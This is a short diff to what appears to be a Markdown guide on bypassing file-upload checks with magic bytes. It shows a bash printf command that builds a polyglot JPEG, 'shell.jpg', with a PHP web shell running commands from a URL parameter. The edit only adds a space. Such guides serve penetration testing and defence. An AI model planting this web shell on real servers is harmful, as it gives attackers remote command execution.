@@ -28,5 +28,5 @@ JPG files always begin with the bytes `FF D8 FF`
 - _magic bytes or magic numbers_ Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.
 
 ```bash
-printf "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\n<?php echo system(\$_GET['cmd']); ?>" > shell.jpg
+printf "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\n <?php echo system(\$_GET['cmd']); ?>" > shell.jpg
 ```
